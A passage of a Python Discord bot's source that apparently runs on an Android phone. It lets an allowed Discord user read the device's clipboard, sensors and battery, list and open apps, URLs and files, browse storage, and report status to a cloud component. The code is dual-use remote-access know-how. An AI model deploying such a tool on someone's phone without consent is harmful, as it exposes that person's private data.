    await interaction.followup.send(embed=embed)


@bot_command("accelerometer", "📊 مستشعر التسارع")
@require_allowed
@require_bridge
@with_stats("accelerometer")
async def accelerometer_cmd(interaction: discord.Interaction):
    await interaction.response.defer()

    try:
        data = await asyncio.to_thread(_bridge.read_accelerometer)
        result = json.loads(data) if data else {}
    except Exception as e:
        await _safe_reply(interaction, f"❌ {e}")
        return

    if result.get("status") == "no_sensor":
        await _safe_reply(interaction,
                          "❌ **الجهاز لا يحتوي على مستشعر التسارع.**")
        return
    if result.get("status") == "timeout":
        await _safe_reply(interaction, "⏰ لم تحصل قراءة.")
        return

    x = result.get("x", 0)
    y = result.get("y", 0)
    z = result.get("z", 0)

    embed = _make_embed(
        "📊 مستشعر التسارع",
        f"➡️ X: `{x:.2f}` m/s²\n"
        f"⬆️ Y: `{y:.2f}` m/s²\n"
        f"🔵 Z: `{z:.2f}` m/s²",
        Colors.SENSORS,
    )
    await interaction.followup.send(embed=embed)


@bot_command("gyroscope", "🌀 مستشعر الجيروسكوب")
@require_allowed
@require_bridge
@with_stats("gyroscope")
async def gyroscope_cmd(interaction: discord.Interaction):
    await interaction.response.defer()

    try:
        data = await asyncio.to_thread(_bridge.read_gyroscope)
        result = json.loads(data) if data else {}
    except Exception as e:
        await _safe_reply(interaction, f"❌ {e}")
        return

    if result.get("status") == "no_sensor":
        await _safe_reply(interaction,
                          "❌ **الجهاز لا يحتوي على جيروسكوب.**")
        return
    if result.get("status") == "timeout":
        await _safe_reply(interaction, "⏰ لم تحصل قراءة.")
        return

    x = result.get("x", 0)
    y = result.get("y", 0)
    z = result.get("z", 0)

    embed = _make_embed(
        "🌀 الجيروسكوب",
        f"➡️ X: `{x:.3f}` rad/s\n"
        f"⬆️ Y: `{y:.3f}` rad/s\n"
        f"🔵 Z: `{z:.3f}` rad/s",
        Colors.SENSORS,
    )
    await interaction.followup.send(embed=embed)


# ═══════════════════════════════════════════════════════════════════
#                       Apps Commands
# ═══════════════════════════════════════════════════════════════════
@bot_command("openapp", "📱 افتح تطبيقًا")
@app_commands.describe(app="اسم التطبيق أو الحزمة")
@require_allowed
@require_bridge
@with_stats("openapp")
async def openapp_cmd(interaction: discord.Interaction, app: str):
    await interaction.response.defer()
    query = app.strip()
    if query.lower() in ("whatsapp", "wa"):
        result = await asyncio.to_thread(_bridge.open_whatsapp_home)
    else:
        result = await asyncio.to_thread(_bridge.open_app, query)
    await _safe_reply(interaction, result)


@bot_command("apps", "📱 قائمة التطبيقات")
@app_commands.describe(search="بحث")
@require_allowed
@require_bridge
@with_stats("apps")
async def apps_cmd(interaction: discord.Interaction, search: str = None):
    await interaction.response.defer()
    apps = await asyncio.to_thread(_bridge.list_installed_apps)
    if not apps:
        await _safe_reply(interaction,
                          "❌ لم أتمكن من قراءة التطبيقات.")
        return
    if search:
        q = search.lower()
        apps = [p for p in apps if q in p.lower()]
    apps = sorted(apps)
    if not apps:
        await _safe_reply(interaction, "لا نتائج.")
        return

    chunks = [apps[i:i+25] for i in range(0, min(len(apps), 100), 25)]
    for chunk in chunks[:4]:
        options = [discord.SelectOption(label=p[:100],
                                         value=short_key(p))
                   for p in chunk]
        view = discord.ui.View(timeout=900)
        select = discord.ui.Select(
            placeholder=f"اختر تطبيقًا (إجمالي {len(apps)})",
            options=options
        )

        async def cb(it):
            if not _check(it):
                await _safe_reply(it, "🚫 غير مصرّح", ephemeral=True)
                return
            key = it.data["values"][0]
            pkg = resolve_key(key)
            await it.response.defer()
            result = await asyncio.to_thread(_bridge.open_app, pkg)
            await _safe_reply(it, result)

        select.callback = cb
        view.add_item(select)

        embed = _make_embed(
            f"📱 {len(apps)} تطبيق",
            f"بحث: `{search}`" if search else "الكل",
            Colors.APPS,
        )
        await interaction.followup.send(embed=embed, view=view)


@bot_command("openurl", "🔗 افتح رابطًا")
@app_commands.describe(url="الرابط")
@require_allowed
@require_bridge
@with_stats("openurl")
async def openurl_cmd(interaction: discord.Interaction, url: str):
    await interaction.response.defer()
    result = await asyncio.to_thread(_bridge.open_url, url.strip())
    await _safe_reply(interaction, f"{result}\n`{url}`")


@bot_command("open", "📂 افتح ملفًا")
@app_commands.describe(path="المسار")
@require_allowed
@require_bridge
@with_stats("open")
async def open_cmd(interaction: discord.Interaction, path: str):
    if not is_path_allowed(path) or not os.path.isfile(path):
        await _safe_reply(interaction, "❌ مسار غير صالح.", ephemeral=True)
        return
    await interaction.response.defer()
    result = await asyncio.to_thread(_bridge.open_file, path)
    await _safe_reply(interaction, f"{result}\n`{path}`")


# ═══════════════════════════════════════════════════════════════════
#                       Favorites
# ═══════════════════════════════════════════════════════════════════
@bot_command("save", "⭐ أضف للمفضلة")
@app_commands.describe(path="المسار", label="اسم مختصر")
@require_allowed
@with_stats("save")
async def save_cmd(interaction: discord.Interaction, path: str,
                    label: str = None):
    if not is_path_allowed(path) or not os.path.isdir(path):
        await _safe_reply(interaction, "❌ مسار غير صالح.", ephemeral=True)
        return
    FAVORITES.append({
        "path": path,
        "label": label or os.path.basename(path) or path
    })
    await _safe_reply(interaction, f"⭐ حُفظ: `{path}`", ephemeral=True)


@bot_command("favorites", "⭐ اعرض المفضلة")
@require_allowed
@with_stats("favorites")
async def favorites_cmd(interaction: discord.Interaction):
    if not FAVORITES:
        await _safe_reply(interaction,
                          "لا توجد مفضلات. استخدم `/save`.",
                          ephemeral=True)
        return
    options = [discord.SelectOption(
        label=f["label"][:100],
        value=short_key(f["path"]),
        description=f["path"][:100]
    ) for f in FAVORITES[:25]]
    view = discord.ui.View(timeout=900)
    select = discord.ui.Select(placeholder="اختر مجلدًا", options=options)

    async def cb(it):
        if not _check(it):
            await _safe_reply(it, "🚫 غير مصرّح", ephemeral=True)
            return
        key = it.data["values"][0]
        p = resolve_key(key)
        if not p or not os.path.isdir(p):
            await _safe_reply(it, "❌ غير موجود", ephemeral=True)
            return
        if _ADVANCED_BROWSER:
            state = BrowseState(path=p)
            v = AdvancedFileBrowserView(
                state=state,
                root=ALLOWED_ROOT,
                allowed_roots=DISCOVERED_ROOTS,
                is_allowed_fn=is_path_allowed,
                check_user_fn=_check,
                device_name=DEVICE_NAME,
            )
            try:
                await it.response.edit_message(
                    content=v.build_title(), view=v)
            except Exception:
                await _safe_reply(it, v.build_title(), view=v)
        else:
            v = SimpleFileBrowserView(p, 0)
            try:
                await it.response.edit_message(
                    content=v.title(), view=v)
            except Exception:
                await _safe_reply(it, v.title(), view=v)

    select.callback = cb
    view.add_item(select)

    embed = _make_embed("⭐ المفضلة", color=Colors.FILES)
    await interaction.response.send_message(embed=embed, view=view)


@bot_command("upload", "📥 معلومات الرفع")
@require_allowed
@with_stats("upload")
async def upload_cmd(interaction: discord.Interaction):
    await _safe_reply(
        interaction,
        f"📥 أرسل أي ملف كمرفق وسيُحفظ في:\n`{UPLOAD_DIR}`",
        ephemeral=True,
    )


# ═══════════════════════════════════════════════════════════════════
#                       Utilities
# ═══════════════════════════════════════════════════════════════════
@bot_command("battery", "🔋 حالة البطارية")
@require_allowed
@require_bridge
@with_stats("battery")
async def battery_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    data = await asyncio.to_thread(_bridge.get_battery)
    try:
        d = json.loads(data) if data else {}
        if not d:
            await _safe_reply(interaction,
                              "❌ لم أتمكن من قراءة البطارية.")
            return
        embed = _make_embed("🔋 حالة البطارية", color=Colors.DEVICE)
        embed.add_field(name="النسبة",
                        value=f"**{d.get('percentage', '?')}%**",
                        inline=True)
        embed.add_field(name="الحالة",
                        value=f"`{d.get('status', '?')}`", inline=True)
        embed.add_field(name="الحرارة",
                        value=f"`{d.get('temperature_c', '?')}°C`",
                        inline=True)
        embed.add_field(name="الصحة",
                        value=f"`{d.get('health', '?')}`", inline=True)
        embed.add_field(name="الشحن",
                        value=f"`{d.get('plugged', '?')}`", inline=True)
        embed.add_field(name="التقنية",
                        value=f"`{d.get('technology', '?')}`",
                        inline=True)
        await interaction.followup.send(embed=embed)
    except Exception as e:
        await _safe_reply(interaction, f"❌ {e}")


@bot_command("clipboard", "📋 قراءة الحافظة")
@require_allowed
@require_bridge
@with_stats("clipboard")
async def clipboard_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    text = await asyncio.to_thread(_bridge.get_clipboard)
    if text:
        embed = _make_embed(
            "📋 الحافظة",
            f"```\n{text[:1800]}\n```",
            Colors.INFO,
        )
        await interaction.followup.send(embed=embed)
    else:
        await _safe_reply(interaction, "📋 الحافظة فارغة.")


@bot_command("toast", "💬 رسالة على الشاشة")
@app_commands.describe(text="النص")
@require_allowed
@require_bridge
@with_stats("toast")
async def toast_cmd(interaction: discord.Interaction, text: str):
    await interaction.response.defer()
    ok = await asyncio.to_thread(_bridge.show_toast, text[:100])
    await _safe_reply(interaction,
                      "✅ ظهرت الرسالة" if ok else "❌ فشل")


# ═══════════════════════════════════════════════════════════════════
#                       Storage Commands
# ═══════════════════════════════════════════════════════════════════
@bot_command("roots", "📚 جذور التخزين")
@require_allowed
@with_stats("roots")
async def roots_cmd(interaction: discord.Interaction):
    if not DISCOVERED_ROOTS:
        await _safe_reply(interaction, "لا جذور!", ephemeral=True)
        return
    lines = []
    for i, r in enumerate(DISCOVERED_ROOTS, 1):
        marker = " ⭐" if r == ALLOWED_ROOT else ""
        lines.append(f"`{i}.` `{r}`{marker}")
    embed = _make_embed(
        "📚 جذور التخزين",
        "\n".join(lines) + f"\n\n**النشط:** `{ALLOWED_ROOT}`",
        Colors.FILES,
    )
    await interaction.response.send_message(embed=embed)


@bot_command("setroot", "📁 عيّن جذرًا")
@app_commands.describe(path="المسار")
@require_allowed
@with_stats("setroot")
async def setroot_cmd(interaction: discord.Interaction, path: str):
    global ALLOWED_ROOT
    if not os.path.isdir(path):
        await _safe_reply(interaction, f"❌ ليس مجلدًا: `{path}`",
                          ephemeral=True)
        return
    real = os.path.realpath(path)
    if real not in [os.path.realpath(r) for r in DISCOVERED_ROOTS]:
        DISCOVERED_ROOTS.append(real)
    ALLOWED_ROOT = real
    await _safe_reply(interaction, f"✅ الجذر الآن: `{ALLOWED_ROOT}`")


@bot_command("rescan", "🔄 إعادة اكتشاف الجذور")
@require_allowed
@with_stats("rescan")
async def rescan_cmd(interaction: discord.Interaction):
    global DISCOVERED_ROOTS, ALLOWED_ROOT
    await interaction.response.defer()
    old = set(DISCOVERED_ROOTS)
    DISCOVERED_ROOTS = _discover_storage_roots()
    new = set(DISCOVERED_ROOTS) - old
    if DISCOVERED_ROOTS:
        ALLOWED_ROOT = DISCOVERED_ROOTS[0]
    embed = _make_embed(
        "🔄 اكتمل",
        f"📚 الإجمالي: **{len(DISCOVERED_ROOTS)}**\n"
        f"🆕 جديد: **{len(new)}**\n"
        f"📁 النشط: `{ALLOWED_ROOT}`",
        Colors.SUCCESS,
    )
    await interaction.followup.send(embed=embed)


@bot_command("storage_test", "🔬 اختبار الوصول للتخزين")
@require_allowed
@require_bridge
@with_stats("storage_test")
async def storage_test_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    try:
        result = await asyncio.to_thread(_bridge.test_storage_access)
    except Exception as e:
        result = f"❌ {e}"
    embed = _make_embed(
        "🔍 نتائج اختبار التخزين",
        f"```json\n{result}\n```",
        Colors.INFO,
    )
    await interaction.followup.send(embed=embed)


# ═══════════════════════════════════════════════════════════════════
#                       Info Commands
# ═══════════════════════════════════════════════════════════════════
@bot_command("sysinfo", "💻 معلومات النظام")
@require_allowed
@with_stats("sysinfo")
async def sysinfo_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    embed = _make_embed("💻 معلومات النظام", color=Colors.DEVICE)
    embed.add_field(
        name="🖥️ البوت",
        value=(f"• الاسم: `{DEVICE_NAME}`\n"
               f"• Python: `{sys.version.split()[0]}`\n"
               f"• النظام: `{platform.system()} {platform.release()}`\n"
               f"• النسخة: `v{VERSION}`"),
        inline=True,
    )
    embed.add_field(
        name="📱 الجهاز",
        value=(f"• الطراز: `{ANDROID.model or '?'}`\n"
               f"• المُصنّع: `{ANDROID.vendor_name}`\n"
               f"• Android: `{ANDROID.release}`\n"
               f"• SDK: `{ANDROID.sdk}`"),
        inline=True,
    )
    embed.add_field(
        name="📦 المكونات",
        value=(f"• Bridge: {'✅' if _BRIDGE_AVAILABLE else '❌'}\n"
               f"• Cloud: {'✅' if _CLOUD_AVAILABLE else '❌'}\n"
               f"• Browser: {'✅' if _ADVANCED_BROWSER else '⚠️'}\n"
               f"• PIL: {'✅' if HAS_PIL else '❌'}\n"
               f"• Contacts: {'✅' if _is_contacts_ready() else '❌'}"),
        inline=False,
    )
    embed.add_field(
        name="📁 التخزين",
        value=(f"• الجذر: `{ALLOWED_ROOT}`\n"
               f"• الجذور: **{len(DISCOVERED_ROOTS)}**"),
        inline=False,
    )
    embed.add_field(
        name="⚡ الإحصائيات",
        value=(f"• Cache: `{LIST_CACHE.size()}`\n"
               f"• Uptime: `{STATS._fmt_time(STATS.uptime())}`"),
        inline=True,
    )
    await interaction.followup.send(embed=embed)


# ═══════════════════════════════════════════════════════════════════
#                       Lifecycle API
# ═══════════════════════════════════════════════════════════════════
_bot_start_lock = threading.RLock()


def _ensure_bot_alive():
    """يضمن وجود bot صالح. إذا كان مغلقاً → يعيد البناء."""
    global bot
    try:
        if bot.is_closed():
            log.warning("🔧 Bot is closed — rebuilding...")
            bot = _create_bot()
            _ready_called["value"] = False
            _synced_once["value"] = False
            log.info("✅ Bot rebuilt")
    except Exception as e:
        log.error(f"_ensure_bot_alive failed: {e}")
    return bot


def start_bot(
    token: str,
    prefix: str = "!",
    owner_id: Optional[int] = None,
    guild_id: Optional[int] = None,
    allowed_user_id: Optional[int] = None,
    enable_message_content: bool = True,
    enable_members: bool = False,
    enable_presences: bool = False,
    enable_all_intents: bool = False,
    context: Any = None,
    device_id: str = "",
) -> str:
    """نقطة الدخول الرئيسية من Java."""
    global bot

    log.info("=" * 60)
    log.info(f"🚀 start_bot() — v{VERSION} ({VERSION_NAME})")
    log.info(f"👑 owner={owner_id} | guild={guild_id} | "
             f"allowed={allowed_user_id}")
    log.info(f"🆔 device_id={device_id[:8] if device_id else '—'}")
    log.info(f"📱 context={'✅' if context else '❌'}")
    log.info("=" * 60)

    if not token:
        msg = "❌ التوكن فارغ"
        log.error(msg)
        return msg

    token = str(token).strip()
    if len(token) < 20:
        return "❌ التوكن قصير جدًا"

    # إيقاف أي نسخة سابقة
    with _bot_start_lock:
        if STATE.is_running:
            log.warning("⚠️ إيقاف البوت القديم...")
            try:
                _stop_internal()
                time.sleep(1)
            except Exception as e:
                log.warning(f"stop previous failed: {e}")

    # حفظ الإعدادات
    with STATE._lock:
        STATE.token = token
        STATE.prefix = prefix or DEFAULT_PREFIX
        STATE.owner_id = int(owner_id) if owner_id else None
        STATE.guild_id = int(guild_id) if guild_id else None
        STATE.allowed_user_id = int(allowed_user_id) if allowed_user_id else None
        STATE.device_id = device_id or ""
        STATE.context = context

    # تهيئة cloud_agent (best-effort)
    if _CLOUD_AVAILABLE and context is not None:
        try:
            _cloud.set_context(context)
            log.info("✅ cloud_agent context set")
        except Exception as e:
            log.warning(f"cloud_agent.set_context failed: {e}")

    # إعادة بناء البوت إن لزم
    _ensure_bot_alive()
    _ready_called["value"] = False
    _synced_once["value"] = False

    if STATE.owner_id:
        try:
            bot.owner_id = int(STATE.owner_id)
        except Exception:
            pass

    STATE.mark_running()
    STATS.reset_uptime()

    try:
        log.info("▶️ bot.start() starting...")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        with STATE._lock:
            STATE.loop = loop

        loop.run_until_complete(bot.start(STATE.token))
        log.info("⏹️ bot.start() ended")
        return "✅ تم إيقاف البوت"

    except discord.LoginFailure:
        msg = "❌ تسجيل الدخول فشل: التوكن غير صحيح"
        log.error(msg)
        STATE.set_error(msg)
        return msg

    except discord.PrivilegedIntentsRequired:
        msg = ("❌ فعّل Privileged Intents:\n"
               "1. discord.com/developers/applications\n"
               "2. تطبيقك → Bot\n"
               "3. فعّل Message Content Intent")
        log.error(msg)
        STATE.set_error(msg)
        return msg

    except discord.HTTPException as e:
        msg = f"❌ HTTP: {e}"
        log.error(msg)
        STATE.set_error(msg)
        return msg

    except KeyboardInterrupt:
        return "⏹️ إيقاف يدوي"

    except Exception as e:
        log.exception("start_bot failed", e)
        STATE.set_error(str(e))
        return f"❌ خطأ: {e}"

    finally:
        STATE.mark_stopped()
        # Report to cloud (best-effort)
        if _CLOUD_AVAILABLE and STATE.cloud_reported:
            try:
                _cloud.report_bot_running(False)
                STATE.cloud_reported = False
            except Exception:
                pass


def _stop_internal():
    try:
        with STATE._lock:
            loop = STATE.loop
        if bot is not None and not bot.is_closed() and loop is not None:
            try:
                fut = asyncio.run_coroutine_threadsafe(bot.close(), loop)
                try:
                    fut.result(timeout=5)
                except Exception:
                    pass
            except Exception as e:
                log.debug(f"_stop_internal: {e}")
    except Exception as e:
        log.warning(f"_stop_internal outer: {e}")


def stop_bot() -> str:
    log.info("⏹️ stop_bot() called")
    try:
        STATE.get_stop_event().set()
        _stop_internal()
        # Report to cloud
        if _CLOUD_AVAILABLE and STATE.cloud_reported:
            try:
                _cloud.report_bot_running(False)
                STATE.cloud_reported = False
            except Exception:
                pass
        return "✅ تم الإرسال"
    except Exception as e:
        log.exception("stop_bot failed", e)
        return f"❌ فشل: {e}"


def get_bot_status() -> Dict[str, Any]:
    if bot is None:
        return {"running": False, "reason": "not_initialized"}
    if bot.is_closed():
        return {"running": False, "reason": "closed"}

    with STATE._lock:
        start = STATE.start_time
        uptime = int(time.time() - start) if start else 0
        is_running = STATE.is_running
        last_error = STATE.last_error
        device_id = STATE.device_id

    try:
        user_name = str(bot.user) if bot.user else None
        user_id = bot.user.id if bot.user else None
    except Exception:
        user_name = None
        user_id = None

    return {
        "running": is_running,
        "user": user_name,
        "user_id": user_id,
        "guilds": len(bot.guilds),
        "latency_ms": round(bot.latency * 1000) if bot.latency else 0,
        "uptime_seconds": uptime,
        "last_error": last_error,
        "version": VERSION,
        "version_name": VERSION_NAME,
        "bridge_available": _BRIDGE_AVAILABLE,
        "cloud_available": _CLOUD_AVAILABLE,
        "advanced_browser": _ADVANCED_BROWSER,
        "contacts_ready": _is_contacts_ready(),
        "device_id": device_id,
        "cloud_reported": STATE.cloud_reported,
    }


def is_contacts_bridge_ready() -> bool:
    return _is_contacts_ready()


# ═══════════════════════════════════════════════════════════════════
#                       Registration Log
# ═══════════════════════════════════════════════════════════════════
log.info(f"✅ hawkmoth_bot.py v{VERSION} ({VERSION_NAME}) loaded")
log.info(f"   • Commands registered: {len(_command_registry)}")
log.info(f"   • Events registered:   {len(_event_handlers)}")
log.info(f"   • bridge:              {_BRIDGE_AVAILABLE}")
log.info(f"   • cloud_agent:         {_CLOUD_AVAILABLE}")
log.info(f"   • advanced_browser:    {_ADVANCED_BROWSER}")
log.info(f"   • PIL:                 {HAS_PIL}")
log.info(f"   • Roots:               {len(DISCOVERED_ROOTS)}")
